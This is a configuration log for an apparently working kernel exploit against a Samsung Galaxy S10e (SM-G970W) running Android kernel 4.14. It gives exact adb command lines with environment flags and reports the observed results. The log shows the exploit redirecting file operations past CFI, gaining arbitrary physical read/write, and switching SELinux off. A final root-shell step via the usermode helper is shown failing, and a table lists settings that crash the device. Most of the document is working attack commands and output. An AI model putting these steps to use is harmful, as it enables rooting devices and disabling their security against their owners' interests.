# RUN_CONFIG.md — working run configurations (on-device, session 5)

Device: SM-G970W, `4.14.190-23725627-abG970WVLU9IXE1`.
Binaries: `glA9` (driver) + `dnroot` (UMH payload), built with `tools/build14.sh`.
Per boot: get `SLIDE` with `slideprobe`; let the device **settle** (avoid running
right after boot — busier = higher wedge rate).

Each run is **one** adb command (no `&`/`;` chaining); env flags passed via `env`.

## Stage 1 — walk + fops redirect: **WORKS (5/5 consecutive)**

```
env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 \
    ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 SLIDE=0x<slide> \
    timeout 120 /data/local/tmp/glA9 --stop-after=verify --log=info
```

Observed (every time): `walked=1`, `calls=1`, `success=1`, `cfi write ret=35`,
`cfi read ret=35`, `cfi fops_before == fake_fops`, **no reboot**.

What matters:
- `--log=info` → **no `pr_info+fsync` before the walk** (that fsync is the aggravator).
- `SSOPT_HOLD=0` (default now) → no `select()` hold.
- `SSOPT_OWNER0=0`, `SSOPT_EMPTY=1`, `SSOPT_FAKE_TASK=1`, `PSELECT_ROUTE_DELAY_USEC=0`.

## Stage 2 — redirect + physrw + SELinux off: **WORKS**; UMH fails

```
env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 \
    ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 SLIDE=0x<slide> \
    timeout 150 /data/local/tmp/glA9 --stop-after=umh --log=info
```

Observed:
- redirect OK: `cfi fops_before == fake_fops`;
- `slide restore boot_id` OK; `kaslr read` OK;
- `physrw: configfs-only mode (pipe slab scan bypassed)` → arbitrary R/W live;
- `umh: step1 selinux write ok; /sys/fs/selinux/enforce='0'` → SELinux off;
- **UMH FAILS:** `umh: result wake=1 complete=1 retval=-126` →
  `umh: kernel exec failed retval=-126` (**-ENOKEY**: the kernel-spawned task
  cannot `execve()` a `/data` binary — no fscrypt keyring). No marker
  `umh_root_proof` / `.ghostlock_rootshell`. Device became unresponsive afterwards
  (rebooted).

## FAILED configurations (do NOT use)

| config | result |
|---|---|
| `--log=debug` | adds `pr_info+fsync` right before the walk → **wedge** (RCU stall at `rt_mutex_adjust_prio_chain+0x1dc`), watchdog reboot |
| `SSOPT_OWNER0=1` | **wedge** |
| `SSOPT_HOLD=1` | **wedge** (the `select()` hold overwrites the waiter) |
| run right after boot | higher wedge rate (settle first) |

## Summary

The reliable, working prefix is:

```
env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 SSOPT_HOLD=0 \
    PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 \
    SLIDE=0x<slide> timeout 150 /data/local/tmp/glA9 --stop-after=<stage> --log=info
```

- `--stop-after=verify` → walk + fops redirect **reliably works**.
- `--stop-after=umh` → redirect + configfs arbitrary R/W + SELinux off **work**;
  **UMH is blocked by `-ENOKEY` at exec**.
